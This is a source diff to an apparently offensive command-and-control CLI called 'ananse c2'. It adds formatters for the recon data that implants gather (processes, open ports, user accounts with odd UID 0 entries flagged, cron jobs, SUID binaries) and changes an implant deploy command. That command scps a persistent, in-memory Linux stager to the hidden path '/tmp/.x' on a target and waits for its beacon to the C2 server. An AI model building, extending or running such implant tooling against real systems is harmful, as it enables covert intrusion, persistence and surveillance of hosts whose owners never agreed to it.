@@ -6,16 +6,367 @@ import { dirname } from "node:path";
 import { fileURLToPath } from "node:url";
 import { C2Client, resolveClientConfig } from "./api.js";
 
+// ---------------------------------------------------------------------------
+// Recon result formatter — structures raw module output into readable sections
+// ---------------------------------------------------------------------------
+
+const RECON_HEADER_RE = /^=== (\w+) ===$/gm;
+
+interface ReconSection {
+  name: string;
+  body: string;
+}
+
+interface KnownPort {
+  port: number;
+  name: string;
+}
+
+const WELL_KNOWN_PORTS: KnownPort[] = [
+  { port: 22, name: "SSH" },
+  { port: 23, name: "Telnet" },
+  { port: 80, name: "HTTP" },
+  { port: 443, name: "HTTPS" },
+  { port: 8443, name: "HTTPS-alt" },
+  { port: 3306, name: "MySQL" },
+  { port: 5432, name: "PostgreSQL" },
+  { port: 6379, name: "Redis" },
+  { port: 27017, name: "MongoDB" },
+  { port: 3389, name: "RDP" },
+  { port: 5900, name: "VNC" },
+  { port: 8080, name: "HTTP-proxy" },
+  { port: 9090, name: "Prometheus" },
+  { port: 3000, name: "Dashboard" },
+  { port: 5000, name: "Docker-reg" },
+  { port: 9001, name: "Tor" },
+];
+
+function describePort(port: number): string {
+  const known = WELL_KNOWN_PORTS.find((p) => p.port === port);
+  return known ? `${known.name}` : "";
+}
+
+function parseReconSections(raw: string): ReconSection[] | null {
+  const lines = raw.split("\n");
+  const sections: ReconSection[] = [];
+  let current: ReconSection | null = null;
+  const body: string[] = [];
+
+  // Check if this looks like structured recon output
+  let hasHeader = false;
+  for (const line of lines) {
+    const m = line.match(/^=== (\w+) ===$/);
+    if (m) {
+      if (current) {
+        current.body = body.join("\n").trim();
+      }
+      hasHeader = true;
+      current = { name: m[1], body: "" };
+      sections.push(current);
+      body.length = 0;
+    } else if (current) {
+      body.push(line);
+    }
+  }
+  if (current) {
+    current.body = body.join("\n").trim();
+  }
+
+  return hasHeader ? sections : null;
+}
+
+function formatProcesses(body: string): string {
+  const lines = body.split("\n").filter((l) => l.trim());
+  const kernel: string[] = [];
+  const user: string[] = [];
+  let header = "";
+
+  for (const line of lines) {
+    if (line.startsWith("USER") || line.startsWith("PID")) {
+      header = line;
+      continue;
+    }
+    // Kernel threads have bracketed names like [kthreadd] or start with "root" and contain brackets
+    if (line.includes("[") && line.includes("]")) {
+      kernel.push(line);
+    } else {
+      user.push(line);
+    }
+  }
+
+  const parts: string[] = [];
+  if (header) parts.push(picocolors.dim(header));
+  // Show up to 60 user process lines
+  if (user.length > 0) {
+    parts.push(...user.slice(0, 60));
+    if (user.length > 60) {
+      parts.push(picocolors.dim(`  ... and ${user.length - 60} more user processes`));
+    }
+  }
+  if (kernel.length > 0) {
+    parts.push(picocolors.dim(`  (${kernel.length} kernel threads hidden)`));
+  }
+  return parts.join("\n");
+}
+
+function formatNetwork(body: string): string {
+  const lines = body.split("\n").filter((l) => l.trim());
+  const listening: string[] = [];
+  const established: string[] = [];
+  const other: string[] = [];
+  const headers: string[] = [];
+
+  for (const line of lines) {
+    if (line.startsWith("State") || line.startsWith("Recv-Q") || line === "---") {
+      headers.push(line);
+      continue;
+    }
+    if (line.includes("LISTEN")) {
+      listening.push(line);
+    } else if (line.includes("ESTAB")) {
+      established.push(line);
+    } else if (/^\d+:[\da-fA-F]+/.test(line.trim())) {
+      // /proc/net/tcp raw lines — skip these, they're redundant with ss
+      continue;
+    } else {
+      other.push(line);
+    }
+  }
+
+  const parts: string[] = [];
+  if (listening.length > 0) {
+    parts.push(picocolors.cyan("  LISTENING PORTS"));
+    parts.push(picocolors.dim("  ───────────────"));
+    for (const l of listening) {
+      // Try to annotate with service name
+      const portMatch = l.match(/:(\d+)\s/);
+      let annotation = "";
+      if (portMatch) {
+        const info = describePort(parseInt(portMatch[1], 10));
+        if (info) annotation = picocolors.green(`  ← ${info}`);
+      }
+      parts.push(`  ${l}${annotation}`);
+    }
+  }
+  if (established.length > 0) {
+    parts.push(picocolors.yellow("  CONNECTIONS"));
+    parts.push(picocolors.dim("  ────────────"));
+    for (const e of established) {
+      parts.push(`  ${e}`);
+    }
+  }
+  if (other.length > 0) {
+    const filtered = other.filter((l) => !l.startsWith("/proc/") && l !== "---");
+    if (filtered.length > 0) {
+      parts.push(picocolors.dim("  Other network info"));
+      for (const o of filtered) {
+        parts.push(`  ${o}`);
+      }
+    }
+  }
+  return parts.join("\n");
+}
+
+function formatUsers(body: string): string {
+  const lines = body.split("\n");
+  const passwd: string[] = [];
+  const logins: string[] = [];
+  const others: string[] = [];
+  let section = "passwd";
+
+  for (const line of lines) {
+    const t = line.trim();
+    if (t === "---LOGIN---") { section = "login"; continue; }
+    if (t === "---LAST---") { section = "last"; continue; }
+
+    if (section === "passwd" && t) {
+      passwd.push(t);
+    } else if (section === "login" && t) {
+      logins.push(t);
+    } else if (t) {
+      others.push(t);
+    }
+  }
+
+  const parts: string[] = [];
+
+  // Parse /etc/passwd for human users
+  const humanUsers: string[] = [];
+  const serviceUsers: string[] = [];
+  for (const line of passwd) {
+    const fields = line.split(":");
+    if (fields.length < 7) continue;
+    const shell = fields[6];
+    const uid = parseInt(fields[2], 10);
+    if (uid === 0 || shell?.endsWith("/bash") || shell?.endsWith("/zsh") || shell?.endsWith("/sh") || shell?.endsWith("/fish")) {
+      const note = uid === 0 && fields[0] !== "root" ? picocolors.red(" ← non-root UID 0!") : "";
+      humanUsers.push(`  ${fields[0]}:uid=${fields[2]} shell=${shell}${note}`);
+    } else if (uid >= 1000 && uid < 65534) {
+      humanUsers.push(`  ${fields[0]}:uid=${fields[2]} shell=${shell}`);
+    } else {
+      serviceUsers.push(fields[0]);
+    }
+  }
+
+  if (humanUsers.length > 0) {
+    parts.push(picocolors.cyan("  HUMAN / PRIVILEGED USERS"));
+    parts.push(picocolors.dim("  ─────────────────────────"));
+    parts.push(...humanUsers);
+  }
+  if (serviceUsers.length > 0) {
+    parts.push(picocolors.dim(`  (${serviceUsers.length} service accounts — ${serviceUsers.join(", ")})`));
+  }
+
+  if (logins.length > 0) {
+    const active = logins.filter((l) => !l.startsWith("USER") && !l.startsWith("w ") && l.length > 10 && !l.includes("from"));
+    if (active.length > 0) {
+      parts.push(picocolors.yellow("  ACTIVE SESSIONS"));
+      parts.push(picocolors.dim("  ───────────────"));
+      parts.push(...logins);
+    }
+  }
+
+  return parts.join("\n");
+}
+
+function formatCron(body: string): string {
+  const lines = body.split("\n");
+  const cronFiles: string[] = [];
+  const crontabs: string[] = [];
+  const systemd: string[] = [];
+  let section = "files";
+
+  for (const line of lines) {
+    const t = line.trim();
+    if (t === "---CRONTAB---") { section = "crontab"; continue; }
+    if (t === "---SYSTEMD---") { section = "systemd"; continue; }
+    if (!t) continue;
+
+    if (section === "files") {
+      cronFiles.push(t);
+    } else if (section === "crontab") {
+      if (!t.includes("no crontab")) crontabs.push(t);
+    } else if (section === "systemd") {
+      if (t.startsWith("NEXT") || t.startsWith("━") || t.startsWith("─")) continue;
+      systemd.push(t);
+    }
+  }
+
+  const parts: string[] = [];
+
+  if (cronFiles.length > 0) {
+    parts.push(picocolors.cyan("  CRON FILES"));
+    parts.push(picocolors.dim("  ──────────"));
+    parts.push(...cronFiles.map((l) => `  ${l}`));
+  }
+
+  if (crontabs.length > 0) {
+    const nonEmpty = crontabs.filter((l) => !l.startsWith("#") && l.trim());
+    if (nonEmpty.length > 0) {
+      parts.push(picocolors.yellow("  ACTIVE CRONTAB ENTRIES"));
+      parts.push(picocolors.dim("  ──────────────────────"));
+      parts.push(...crontabs.map((l) => `  ${l}`));
+    }
+  }
+
+  if (systemd.length > 0) {
+    parts.push(picocolors.cyan("  SYSTEMD TIMERS"));
+    parts.push(picocolors.dim("  ──────────────"));
+    // Skip header line from systemctl
+    const data = systemd.filter((l) => !l.startsWith("UNIT") && !l.includes("─") && !l.includes("timer"));
+    parts.push(...data.map((l) => `  ${l}`));
+  }
+
+  return parts.join("\n");
+}
+
+function formatSuid(body: string): string {
+  const lines = body.split("\n").filter((l) => l.trim());
+  if (lines.length === 0 || (lines.length === 1 && lines[0].includes("Permission denied"))) {
+    return picocolors.dim("  (no SUID/SGID binaries found or search restricted)");
+  }
+  const parts: string[] = [picocolors.yellow("  SUID/SGID BINARIES")];
+  parts.push(picocolors.dim("  ───────────────────"));
+  parts.push(...lines.map((l) => `  ${l}`));
+  return parts.join("\n");
+}
+
+function formatReconResult(taskType: string, data: string): string {
+  // Normalise task type: "recon_all", "recon_processes", "recon_network", etc.
+  const baseType = taskType.replace(/^recon_?/i, "recon_").toLowerCase();
+  const sections = parseReconSections(data);
+
+  if (!sections) {
+    // Single-module recon or non-recon output — format based on type
+    const formatter = formatters[baseType as keyof typeof formatters];
+    if (formatter) {
+      const header = baseType.replace("recon_", "").toUpperCase();
+      const out: string[] = [];
+      out.push(`  ${picocolors.white("╔")}${picocolors.cyan("═".repeat(56))}${picocolors.white("╗")}`);
+      out.push(`  ${picocolors.white("║")} ${picocolors.bold(picocolors.cyan(reconLabel(header)))}${picocolors.white("║".repeat(Math.max(1, 57 - reconLabel(header).length - 2)))}`);
+      out.push(`  ${picocolors.white("╚")}${picocolors.cyan("═".repeat(56))}${picocolors.white("╝")}`);
+      out.push(formatter(data));
+      return out.join("\n");
+    }
+    return data;
+  }
+
+  // Multi-section recon_all output
+  const out: string[] = [];
+  for (const sec of sections) {
+    const formatter = sectionFormatters[sec.name as keyof typeof sectionFormatters];
+    const formatted = formatter ? formatter(sec.body) : sec.body;
+
+    out.push(`  ${picocolors.white("╔")}${picocolors.cyan("═".repeat(56))}${picocolors.white("╗")}`);
+    out.push(`  ${picocolors.white("║")} ${picocolors.bold(picocolors.cyan(sec.name.padEnd(55)))}${picocolors.white("║")}`);
+    out.push(`  ${picocolors.white("╚")}${picocolors.cyan("═".repeat(56))}${picocolors.white("╝")}`);
+    if (formatted) {
+      out.push(formatted);
+    } else {
+      out.push(picocolors.dim("  (empty)"));
+    }
+    out.push(""); // blank line between sections
+  }
+  return out.join("\n");
+}
+
+function reconLabel(s: string): string {
+  const labels: Record<string, string> = {
+    PROCESSES: "Processes",
+    NETWORK: "Network Connections",
+    USERS: "User Accounts",
+    CRON: "Scheduled Tasks",
+    SUID: "SUID/SGID Binaries",
+  };
+  return labels[s] ?? s;
+}
+
+const sectionFormatters: Record<string, (body: string) => string> = {
+  PROCESSES: formatProcesses,
+  NETWORK: formatNetwork,
+  USERS: formatUsers,
+  CRON: formatCron,
+  SUID: formatSuid,
+};
+
+const formatters: Record<string, (body: string) => string> = {
+  recon_processes: formatProcesses,
+  recon_network: formatNetwork,
+  recon_users: formatUsers,
+  recon_cron: formatCron,
+  recon_suid: formatSuid,
+};
+
 /** Create the `ananse c2` command group with subcommands. */
 export function createC2Command(): Command {
   const c2 = new Command("c2")
-    .description("C2 server operations — manage implants and tasks")
+    .description(`${picocolors.red("[offense]")} C2 server operations — manage implants and tasks`)
     .option("--server <url>", "C2 server URL", process.env.C2_SERVER_URL)
     .option("--key <key>", "C2 API key", process.env.C2_API_KEY);
 
-  // --- fleet ---
+  // --- reach ---
   c2
-    .command("fleet")
+    .command("reach")
     .description("List all registered implants")
     .action(async (_opts: Record<string, unknown>, cmd: Command) => {
       const global = cmd.parent?.opts() ?? {};
@@ -23,8 +374,8 @@ export function createC2Command(): Command {
       const client = new C2Client(cfg);
 
       try {
-        const summary = await client.fleet();
-        console.log(picocolors.cyan(`\n  Fleet: ${summary.total} total, ${picocolors.green(String(summary.active))} active, ${picocolors.red(String(summary.dead))} dead\n`));
+        const summary = await client.reach();
+        console.log(picocolors.cyan(`\n  Reach: ${summary.total} total, ${picocolors.green(String(summary.active))} active, ${picocolors.red(String(summary.dead))} dead\n`));
         for (const imp of summary.implants) {
           const color = imp.status === "active" ? picocolors.green : imp.status === "dead" ? picocolors.red : picocolors.dim;
           const seen = new Date(imp.lastSeen).toLocaleString();
@@ -125,14 +476,15 @@ export function createC2Command(): Command {
         if (task.completedAt) console.log(`  ${picocolors.cyan("Completed:")} ${new Date(task.completedAt).toLocaleString()}`);
 
         if (task.result) {
-          console.log(`\n  ${picocolors.cyan("─".repeat(60))}`);
           if (task.result.success) {
-            console.log(`  ${task.result.data}`);
+            displayFormattedResult(task.type, task.result.data);
           } else {
+            console.log(`\n  ${picocolors.red("╔" + "═".repeat(56) + "╗")}`);
+            console.log(`  ${picocolors.red("║ FAILED")}`);
+            console.log(`  ${picocolors.red("╚" + "═".repeat(56) + "╝")}`);
             console.log(`  ${picocolors.red(task.result.error ?? "failed with no error")}`);
-            if (task.result.data) console.log(`  ${task.result.data}`);
+            if (task.result.data) displayFormattedResult(task.type, task.result.data);
           }
-          console.log(`  ${picocolors.cyan("─".repeat(60))}\n`);
         } else {
           console.log(`\n  (no result yet)\n`);
         }
@@ -182,19 +534,17 @@ export function createC2Command(): Command {
           }
 
           if (updated.status === "completed" || updated.status === "failed") {
-            // Display result
-            console.log(`\n  ${picocolors.cyan("─".repeat(60))}`);
-            if (updated.result) {
-              if (updated.result.success) {
-                console.log(`  ${updated.result.data}`);
-              } else {
-                console.log(`  ${picocolors.red(updated.result.error ?? "failed")}`);
-                if (updated.result.data) console.log(`  ${updated.result.data}`);
-              }
+            if (updated.result?.success) {
+              displayFormattedResult(updated.type, updated.result.data);
+            } else if (updated.result) {
+              console.log(`\n  ${picocolors.red("╔" + "═".repeat(56) + "╗")}`);
+              console.log(`  ${picocolors.red("║ FAILED")}`);
+              console.log(`  ${picocolors.red("╚" + "═".repeat(56) + "╝")}`);
+              console.log(`  ${picocolors.red(updated.result.error ?? "failed")}`);
+              if (updated.result.data) displayFormattedResult(updated.type, updated.result.data);
             } else {
-              console.log(`  ${updated.status === "completed" ? "Completed" : "Failed"} (no result data)`);
+              console.log(`\n  ${updated.status === "completed" ? "Completed" : "Failed"} (no result data)`);
             }
-            console.log(`  ${picocolors.cyan("─".repeat(60))}`);
             console.log(`  ${updated.status === "completed" ? picocolors.green("✔ Done") : picocolors.red("✖ Failed")} — ${updated.completedAt ? new Date(updated.completedAt).toLocaleString() : ""}\n`);
             return;
           }
@@ -244,7 +594,7 @@ export function createC2Command(): Command {
       const buildArgs = [
         buildScript,
         "--server", rawServer,
-        "--stager-token", cfg.apiKey, // reuse API key as stager token for simplicity
+        "--token", cfg.apiKey, // reuse API key as stager token for simplicity
         "--implant-token", process.env.C2_IMPLANT_TOKEN || "imp-token-change-me",
         "--persist",
       ];
@@ -257,20 +607,21 @@ export function createC2Command(): Command {
       }
 
       if (opts.buildOnly) {
-        console.log(picocolors.green(`\n  Built: /tmp/implant + /tmp/stager\n`));
+        console.log(picocolors.green(`\n  Built: /tmp/implant-linux + /tmp/stager-linux\n`));
         return;
       }
 
-      // Deploy
+      // Deploy (Linux target only — stager requires memfd_create)
       const sshPort = opts.port ?? "22";
       const remotePath = opts.remotePath ?? "/tmp/.x";
       const identityArg = opts.key ? `-i ${opts.key}` : "";
+      const stagerPath = "/tmp/stager-linux";
 
       console.log(`  ${picocolors.cyan("==>")} Copying stager to ${picocolors.white(userHost)}:${remotePath}...`);
 
       try {
         execSync(
-          `scp ${identityArg} -P ${sshPort} -q /tmp/stager "${userHost}:${remotePath}"`,
+          `scp ${identityArg} -P ${sshPort} -q ${stagerPath} "${userHost}:${remotePath}"`,
           { stdio: "inherit", cwd: projectRoot, timeout: 30_000 },
         );
       } catch {
@@ -300,9 +651,9 @@ export function createC2Command(): Command {
       while (Date.now() < deadline) {
         await sleep(2000);
         try {
-          const fleet = await client.fleet();
+          const reach = await client.reach();
           // Find the newest active implant (likely ours)
-          const active = fleet.implants
+          const active = reach.implants
             .filter((i: { status: string }) => i.status === "active")
             .sort((a: { firstSeen: string }, b: { firstSeen: string }) => new Date(b.firstSeen).getTime() - new Date(a.firstSeen).getTime());
 
@@ -324,7 +675,7 @@ export function createC2Command(): Command {
       } else {
         console.log(picocolors.yellow(`\n  No beacon received within ${waitSecs}s.`));
         console.log(`  The stager was deployed but the implant may need more time.`);
-        console.log(`  Run ${picocolors.white("ananse c2 fleet")} to check later.\n`);
+        console.log(`  Run ${picocolors.white("ananse c2 reach")} to check later.\n`);
       }
     });
 
@@ -440,6 +791,16 @@ function colorStatus(status: string): string {
     case "delivered": return picocolors.cyan(status);
     case "pending": return picocolors.dim(status);
     default: return status;
+  }
+}
+
+function displayFormattedResult(taskType: string, data: string): void {
+  const formatted = formatReconResult(taskType, data);
+  if (formatted) {
+    console.log(`\n  ${formatted}`);
+  } else {
+    // Fallback: raw output
+    console.log(`\n  ${data}`);
   }
 }
 
